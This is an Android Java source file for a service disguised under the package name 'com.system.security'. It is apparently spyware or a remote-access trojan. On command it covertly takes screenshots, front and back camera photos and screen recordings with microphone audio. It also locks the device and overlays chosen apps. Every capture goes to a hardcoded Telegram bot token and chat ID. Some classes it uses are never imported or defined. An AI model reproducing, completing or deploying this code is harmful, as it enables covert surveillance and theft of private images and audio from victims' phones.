package com.system.security;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.hardware.Camera;
import android.hardware.camera2.CameraManager;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.view.Display;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.FrameLayout;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class ControlService extends AccessibilityService {
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    
    private MediaProjection mediaProjection;
    private ImageReader imageReader;
    private VirtualDisplay virtualDisplay;
    private int screenWidth, screenHeight, screenDensity;
    private MediaProjectionManager projectionManager;
    private OkHttpClient client = new OkHttpClient();
    private Handler handler = new Handler(Looper.getMainLooper());
    private Camera camera;
    private CameraFront frontCamera;
    private MediaRecorder mediaRecorder;
    private boolean isRecordingVideo = false;
    private String currentVideoPath;
    private WindowManager windowManager;
    private View overlayView;

    @Override
    public void onCreate() {
        super.onCreate();
        
        projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        
        DisplayMetrics metrics = new DisplayMetrics();
        windowManager.getDefaultDisplay().getMetrics(metrics);
        screenWidth = metrics.widthPixels;
        screenHeight = metrics.heightPixels;
        screenDensity = metrics.densityDpi;
        
        setupMediaProjection();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.getAction() != null) {
            String action = intent.getAction();
            
            switch (action) {
                case "TAKE_SCREENSHOT":
                    takeScreenshot();
                    break;
                    
                case "TAKE_FRONT_PHOTO":
                    takeFrontCameraPhoto();
                    break;
                    
                case "TAKE_BACK_PHOTO":
                    takeBackCameraPhoto();
                    break;
                    
                case "START_VIDEO_RECORDING":
                    startVideoRecording();
                    break;
                    
                case "STOP_VIDEO_RECORDING":
                    stopVideoRecording();
                    break;
                    
                case "LOCK_DEVICE":
                    lockDevice();
                    break;
                    
                case "UNLOCK_DEVICE":
                    unlockDevice();
                    break;
                    
                case "LOCK_APP":
                    String pkg = intent.getStringExtra("package");
                    lockApp(pkg);
                    break;
                    
                case "UNLOCK_APP":
                    String pkg2 = intent.getStringExtra("package");
                    unlockApp(pkg2);
                    break;
            }
        }
        return super.onStartCommand(intent, flags, startId);
    }

    private void setupMediaProjection() {
        SharedPreferences prefs = getSharedPreferences("screen_capture", MODE_PRIVATE);
        int resultCode = prefs.getInt("resultCode", -1);
        String dataUri = prefs.getString("data", null);
        
        if (resultCode != -1 && dataUri != null) {
            try {
                Intent data = Intent.parseUri(dataUri, 0);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    mediaProjection = projectionManager.getMediaProjection(resultCode, data);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private void takeScreenshot() {
        if (mediaProjection == null) {
            setupMediaProjection();
            if (mediaProjection == null) return;
        }

        try {
            imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);
            
            virtualDisplay = mediaProjection.createVirtualDisplay(
                "Screenshot",
                screenWidth, screenHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(), null, null
            );

            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    Image image = imageReader.acquireLatestImage();
                    if (image != null) {
                        Image.Plane[] planes = image.getPlanes();
                        ByteBuffer buffer = planes[0].getBuffer();
                        
                        Bitmap bitmap = Bitmap.createBitmap(screenWidth, screenHeight, Bitmap.Config.ARGB_8888);
                        bitmap.copyPixelsFromBuffer(buffer);
                        
                        sendPhotoToTelegram(bitmap, "screenshot");
                        
                        image.close();
                        bitmap.recycle();
                    }
                    
                    virtualDisplay.release();
                    imageReader.close();
                }
            }, 500);
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void takeFrontCameraPhoto() {
        try {
            if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                return;
            }
            
            int cameraId = findFrontCamera();
            if (cameraId == -1) return;
            
            camera = Camera.open(cameraId);
            Camera.Parameters params = camera.getParameters();
            
            camera.setPreviewCallback((data, cam) -> {
                Camera.Size size = params.getPreviewSize();
                try {
                    YuvImage yuv = new YuvImage(data, params.getPreviewFormat(), size.width, size.height, null);
                    File file = new File(getCacheDir(), "front_camera.jpg");
                    FileOutputStream out = new FileOutputStream(file);
                    yuv.compressToJpeg(new Rect(0, 0, size.width, size.height), 80, out);
                    out.close();
                    
                    sendFileToTelegram(file, "front_camera.jpg");
                    
                } catch (Exception e) {
                    e.printStackTrace();
                }
                camera.stopPreview();
                camera.release();
                camera = null;
            });
            
            camera.startPreview();
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void takeBackCameraPhoto() {
        try {
            if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                return;
            }
            
            camera = Camera.open();
            Camera.Parameters params = camera.getParameters();
            
            camera.setPreviewCallback((data, cam) -> {
                Camera.Size size = params.getPreviewSize();
                try {
                    YuvImage yuv = new YuvImage(data, params.getPreviewFormat(), size.width, size.height, null);
                    File file = new File(getCacheDir(), "back_camera.jpg");
                    FileOutputStream out = new FileOutputStream(file);
                    yuv.compressToJpeg(new Rect(0, 0, size.width, size.height), 80, out);
                    out.close();
                    
                    sendFileToTelegram(file, "back_camera.jpg");
                    
                } catch (Exception e) {
                    e.printStackTrace();
                }
                camera.stopPreview();
                camera.release();
                camera = null;
            });
            
            camera.startPreview();
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private int findFrontCamera() {
        int cameraCount = Camera.getNumberOfCameras();
        for (int i = 0; i < cameraCount; i++) {
            Camera.CameraInfo info = new Camera.CameraInfo();
            Camera.getCameraInfo(i, info);
            if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                return i;
            }
        }
        return -1;
    }

    private void startVideoRecording() {
        if (mediaProjection == null) {
            setupMediaProjection();
            return;
        }
        
        try {
            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            File videoDir = getExternalFilesDir(Environment.DIRECTORY_MOVIES);
            if (!videoDir.exists()) videoDir.mkdirs();
            
            currentVideoPath = videoDir.getAbsolutePath() + "/video_" + timeStamp + ".mp4";
            
            mediaRecorder = new MediaRecorder();
            
            // صوت من المايك
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setOutputFile(currentVideoPath);
            mediaRecorder.setVideoSize(screenWidth, screenHeight);
            mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setVideoEncodingBitRate(5 * 1024 * 1024);
            mediaRecorder.setVideoFrameRate(30);
            
            mediaRecorder.prepare();
            
            virtualDisplay = mediaProjection.createVirtualDisplay(
                "VideoRecording",
                screenWidth, screenHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mediaRecorder.getSurface(), null, null
            );
            
            mediaRecorder.start();
            isRecordingVideo = true;
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void stopVideoRecording() {
        if (!isRecordingVideo) return;
        
        try {
            mediaRecorder.stop();
            mediaRecorder.release();
            virtualDisplay.release();
            isRecordingVideo = false;
            
            File file = new File(currentVideoPath);
            sendFileToTelegram(file, "video.mp4");
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void lockDevice() {
        try {
            DevicePolicyManager pm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, AdminReceiver.class);
            if (pm.isAdminActive(admin)) {
                pm.lockNow();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void unlockDevice() {
        try {
            // محاكاة تمرير الشاشة لفتحها
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                Path path = new Path();
                path.moveTo(screenWidth / 2, screenHeight - 100);
                path.lineTo(screenWidth / 2, 100);
                
                GestureDescription.Builder builder = new GestureDescription.Builder();
                builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 500));
                dispatchGesture(builder.build(), null, null);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void lockApp(String packageName) {
        try {
            // إنشاء نافذة فوق التطبيق لمنع الوصول
            if (overlayView == null) {
                LayoutInflater inflater = LayoutInflater.from(this);
                overlayView = inflater.inflate(R.layout.overlay_lock, null);
                
                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                        WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                        WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                    PixelFormat.TRANSLUCENT
                );
                
                params.gravity = Gravity.TOP | Gravity.START;
                windowManager.addView(overlayView, params);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void unlockApp(String packageName) {
        try {
            if (overlayView != null) {
                windowManager.removeView(overlayView);
                overlayView = null;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendPhotoToTelegram(Bitmap bitmap, String name) {
        try {
            File file = new File(getCacheDir(), name + ".jpg");
            FileOutputStream out = new FileOutputStream(file);
            bitmap.compress(Bitmap.CompressFormat.JPEG, 85, out);
            out.close();
            
            sendFileToTelegram(file, name + ".jpg");
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendFileToTelegram(File file, String fileName) {
        try {
            RequestBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("caption", "📸 " + fileName + " - " + new Date().toString())
                    .addFormDataPart("document", fileName,
                            RequestBody.create(MediaType.parse("image/jpeg"), file))
                    .build();

            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/sendDocument")
                    .post(requestBody)
                    .build();

            OkHttpClient client = new OkHttpClient();
            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override
                public void onResponse(okhttp3.Call call, Response response) {
                    response.close();
                    file.delete();
                }

                @Override
                public void onFailure(okhttp3.Call call, IOException e) {}
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {}

    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (mediaProjection != null) {
            mediaProjection.stop();
        }
        if (camera != null) {
            camera.release();
        }
        if (mediaRecorder != null) {
            mediaRecorder.release();
        }
        if (overlayView != null) {
            try {
                windowManager.removeView(overlayView);
            } catch (Exception e) {}
        }
    }
                      }
